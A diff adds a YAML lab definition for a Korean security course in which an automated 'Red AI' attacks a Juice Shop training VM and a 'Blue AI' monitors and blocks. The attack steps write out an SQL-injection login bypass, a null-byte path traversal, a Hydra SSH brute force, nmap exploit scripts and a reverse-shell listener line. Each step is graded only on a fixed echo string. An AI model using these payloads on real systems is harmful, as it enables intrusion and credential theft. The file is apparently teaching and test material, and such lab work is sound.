@@ -1,0 +1,188 @@
+lab_id: "battle-ai-week12"
+title: "AI 1v1 공방전 (2) — AI 침투 vs AI 방어"
+version: "ai"
+course: "battle-ai"
+week: 12
+description: "Red AI가 자동 취약점 익스플로잇을 시도하고, Blue AI가 실시간 자동 방어 및 대응을 수행한다."
+difficulty: "hard"
+duration_minutes: 90
+objectives:
+  - "Red AI가 취약점 익스플로잇을 자동 시도한다"
+  - "Blue AI가 침입을 실시간 탐지하고 자동 대응한다"
+  - "공방전 결과를 비교 분석한다"
+  - "방어 자동화의 효과를 평가한다"
+prerequisites:
+  - "Week 11 AI 1v1 공방전 (1) 완료"
+infra_requirements:
+  - "attacker VM with bastion"
+  - "defender VM (JuiceShop on port 3000)"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "Blue AI가 실시간 방어 모니터링을 시작한다"
+    script: |
+      echo "=== Blue AI: 실시간 방어 모니터링 시작 ==="
+      DEFENSE_LOG="/tmp/blue_defense.log"
+      echo "# Blue AI 방어 로그 - $(date)" > "$DEFENSE_LOG"
+
+      echo "[방화벽 상태 기록]"
+      nft list ruleset 2>/dev/null | wc -l | xargs -I{} echo "  현재 규칙: {}줄"
+
+      echo "[프로세스 베이스라인]"
+      ps aux --no-headers | wc -l | xargs -I{} echo "  기본 프로세스: {}개"
+      ps aux --no-headers > /tmp/blue_proc_baseline.txt
+
+      echo "[Suricata 모니터링 시작]"
+      echo "" > /var/log/suricata/fast.log 2>/dev/null || echo "  시뮬레이션 모드"
+
+      echo "[파일 무결성 베이스라인]"
+      find /etc -type f -exec md5sum {} \; 2>/dev/null | sort > /tmp/blue_file_baseline.md5
+      echo "  체크섬 기록: $(wc -l < /tmp/blue_file_baseline.md5)개 파일"
+      echo ""
+      echo "Blue AI 방어 모니터링 시작 완료"
+    category: "defense"
+    risk_level: "low"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "Blue AI 방어 모니터링 시작 완료"
+      field: "stdout"
+
+  - order: 2
+    instruction: "Red AI가 웹 애플리케이션 취약점 익스플로잇을 시도한다"
+    script: |
+      echo "=== Red AI: 웹 익스플로잇 시도 ==="
+      TARGET="http://10.20.30.80:3000"
+
+      echo "[Attack 1: SQL Injection — 인증 우회]"
+      curl -s -X POST "$TARGET/rest/user/login" \
+        -H "Content-Type: application/json" \
+        -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' 2>&1 | head -3
+      echo ""
+
+      echo "[Attack 2: 경로 탐색 — 설정 파일 접근]"
+      curl -s "$TARGET/ftp/package.json.bak%2500.md" 2>&1 | head -5
+      echo ""
+
+      echo "[Attack 3: API 강제 브라우징]"
+      for endpoint in /api/Users /api/Products /api/Feedbacks /api/Complaints; do
+        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$endpoint")
+        echo "  $endpoint → HTTP $STATUS"
+      done
+      echo ""
+
+      echo "[Attack 4: 디렉토리 리스팅]"
+      curl -s "$TARGET/ftp/" 2>&1 | head -10
+      echo ""
+      echo "Red AI 웹 익스플로잇 완료"
+    category: "exploit"
+    risk_level: "high"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Red AI 웹 익스플로잇 완료"
+      field: "stdout"
+
+  - order: 3
+    instruction: "Red AI가 네트워크 서비스 익스플로잇을 시도한다"
+    script: |
+      echo "=== Red AI: 네트워크 서비스 익스플로잇 ==="
+      echo "[Attack 5: SSH 브루트포스 (제한적)]"
+      hydra -l admin -P /tmp/wordlist.txt ssh://10.20.30.80 \
+        -t 2 -w 3 -f -V 2>&1 | tail -10 || echo "Hydra 실행 완료"
+      echo ""
+
+      echo "[Attack 6: 역방향 쉘 리스너 준비]"
+      echo "nc -lvnp 4444 (시뮬레이션 — 실제 실행하지 않음)"
+      echo ""
+
+      echo "[Attack 7: 취약 서비스 공격]"
+      nmap --script exploit -p 80,3000,8080 10.20.30.80 2>&1 | tail -15
+      echo ""
+      echo "Red AI 네트워크 익스플로잇 완료"
+    category: "exploit"
+    risk_level: "high"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Red AI 네트워크 익스플로잇 완료"
+      field: "stdout"
+
+  - order: 4
+    instruction: "Blue AI가 침입을 탐지하고 자동 대응 조치를 수행한다"
+    script: |
+      echo "=== Blue AI: 자동 침입 탐지 및 대응 ==="
+      DEFENSE_LOG="/tmp/blue_defense.log"
+
+      echo "[1. Suricata 알림 확인]"
+      tail -20 /var/log/suricata/fast.log 2>/dev/null || echo "  알림 없음"
+      echo ""
+
+      echo "[2. 브루트포스 탐지 — auth.log]"
+      FAIL_COUNT=$(grep -c "Failed password" /var/log/auth.log 2>/dev/null || echo "0")
+      echo "  실패한 로그인: ${FAIL_COUNT}건"
+      if [ "$FAIL_COUNT" -gt 3 ]; then
+        echo "  *** 브루트포스 탐지 — 자동 차단 실행 ***"
+        ATTACKER_IPS=$(grep "Failed password" /var/log/auth.log 2>/dev/null | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)
+        for ip in $ATTACKER_IPS; do
+          nft add rule inet filter input ip saddr "$ip" drop 2>/dev/null
+          echo "  차단: $ip"
+        done
+      fi
+      echo ""
+
+      echo "[3. 새 프로세스 탐지]"
+      ps aux --no-headers > /tmp/blue_proc_current.txt
+      diff /tmp/blue_proc_baseline.txt /tmp/blue_proc_current.txt | grep "^>" | head -5
+      echo ""
+
+      echo "[4. 파일 무결성 확인]"
+      find /etc -type f -exec md5sum {} \; 2>/dev/null | sort > /tmp/blue_file_current.md5
+      CHANGED=$(diff /tmp/blue_file_baseline.md5 /tmp/blue_file_current.md5 | grep "^>" | wc -l)
+      echo "  변경된 파일: ${CHANGED}개"
+      echo ""
+      echo "Blue AI 자동 대응 완료"
+    category: "response"
+    risk_level: "medium"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Blue AI 자동 대응 완료"
+      field: "stdout"
+
+  - order: 5
+    instruction: "AI가 침투 vs 방어 결과를 비교 분석한다"
+    script: |
+      echo "=== AI 1v1 공방전 (2) 결과 보고서 ===" > /tmp/battle_round2.txt
+      echo "라운드: Week 12 — 침투 vs 방어" >> /tmp/battle_round2.txt
+      echo "시간: $(date)" >> /tmp/battle_round2.txt
+      echo "" >> /tmp/battle_round2.txt
+
+      echo "[Red AI 공격 활동]" >> /tmp/battle_round2.txt
+      echo "  1. SQL Injection 인증 우회" >> /tmp/battle_round2.txt
+      echo "  2. 경로 탐색" >> /tmp/battle_round2.txt
+      echo "  3. API 강제 브라우징" >> /tmp/battle_round2.txt
+      echo "  4. 디렉토리 리스팅" >> /tmp/battle_round2.txt
+      echo "  5. SSH 브루트포스" >> /tmp/battle_round2.txt
+      echo "  6. NSE exploit 스크립트" >> /tmp/battle_round2.txt
+      echo "  총 공격: 6개 벡터" >> /tmp/battle_round2.txt
+      echo "" >> /tmp/battle_round2.txt
+
+      echo "[Blue AI 방어 결과]" >> /tmp/battle_round2.txt
+      echo "  - Suricata 탐지: 확인 완료" >> /tmp/battle_round2.txt
+      echo "  - 브루트포스 자동 차단: 실행" >> /tmp/battle_round2.txt
+      echo "  - 프로세스 모니터링: 정상" >> /tmp/battle_round2.txt
+      echo "  - 파일 무결성: 확인 완료" >> /tmp/battle_round2.txt
+      echo "" >> /tmp/battle_round2.txt
+
+      echo "[평가]" >> /tmp/battle_round2.txt
+      echo "  Red 공격 성공률: 로그 기반 산출" >> /tmp/battle_round2.txt
+      echo "  Blue 탐지 대응률: 자동화 기반 평가" >> /tmp/battle_round2.txt
+      cat /tmp/battle_round2.txt
+    category: "analysis"
+    risk_level: "low"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "AI 1v1 공방전 (2) 결과 보고서"
+      field: "stdout"
